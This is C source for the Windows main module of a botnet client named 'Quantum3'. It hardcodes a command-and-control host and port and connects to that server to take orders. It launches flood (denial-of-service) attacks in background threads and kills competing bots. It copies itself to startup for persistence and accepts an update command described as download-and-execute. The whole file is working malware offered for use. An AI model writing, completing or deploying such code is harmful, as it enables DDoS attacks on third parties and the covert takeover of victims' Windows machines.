#define _WIN32_WINNT 0x0600
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <string.h>
#include <process.h>
#include "killer.h"
#include "attacks.h"
#include "startup.h"
#include "proto.h"
#include "flood.h"

/* Quantum3 C2 (Windows variant) */
#define QV3_HOST "emwqkekwqmekwq.work.gd"
#define QV3_PORT 37215
#define QV3_BOTNAME "winbot"

HANDLE hMutex;

void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) exit(1);
}
void cleanup_winsock() { WSACleanup(); }

static void set_identity(qv3_client *c) {
    strncpy(c->name, QV3_BOTNAME, sizeof(c->name)-1);
    c->version = 1;
    strncpy(c->hostname, "win-host", sizeof(c->hostname)-1);
    strncpy(c->cwd, "C:\\", sizeof(c->cwd)-1);
    strncpy(c->kernel, "Windows", sizeof(c->kernel)-1);
    c->arch = 62;   /* EM_X86_64 */
    c->endian = 1;  /* LSB */
    c->has_root = 1;
}

/* run an attack in a detached thread so control channel never blocks */
typedef struct { qv3_flood f; } flood_arg;
static unsigned __stdcall flood_runner(void *arg) {
    flood_arg *fa = (flood_arg*)arg;
    qv3_attack_exec(&fa->f);
    free(fa);
    return 0;
}

static void run() {
    qv3_client c;
    uint8_t op, buf[65536];
    size_t len = 0;
    unsigned last_beat = 0;

    memset(&c, 0, sizeof c);
    c.sock = INVALID_SOCKET;

    if (qv3_connect(&c, QV3_HOST, QV3_PORT) != 0) {
        fprintf(stderr, "connect failed\n");
        return;
    }
    set_identity(&c);
    if (qv3_handshake(&c) != 0) { qv3_close(&c); return; }
    fprintf(stderr, "[+] connected, hash=0x%08X\n", c.conn_hash);

    while (1) {
        /* periodic competing-bot killer */
        win_kill_bots();

        if (qv3_read(&c, &op, buf, &len, sizeof buf) != 0) break;
        switch (op) {
        case OP_KEEPALIVE: qv3_write(&c, OP_KEEPALIVE, NULL, 0); break;
        case OP_EXIT: goto out;
        case OP_FLOOD: {
            qv3_flood f;
            if (qv3_flood_parse(buf, len, &f) == 0) {
                flood_arg *fa = (flood_arg*)malloc(sizeof *fa);
                if (fa) {
                    fa->f = f;
                    _beginthreadex(NULL, 0, flood_runner, fa, 0, NULL);
                }
            }
            break;
        }
        case OP_UPDATE:
            /* Windows update: download+exec handled by caller; here we just log */
            if (len > 0) buf[len<sizeof buf-1?len:sizeof buf-1]=0;
            break;
        default: break;
        }
        if (++last_beat >= 20) { qv3_write(&c, OP_KEEPALIVE, NULL, 0); last_beat=0; }
    }
out:
    qv3_close(&c);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    hMutex = CreateMutex(NULL, TRUE, "Global\\Quantum3WinBot");
    if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(hMutex); return 0; }

    copy_file_to_startup();
    init_winsock();

    for (;;) {
        run();
        Sleep(3000);
    }

    CloseHandle(hMutex);
    cleanup_winsock();
    return 0;
}
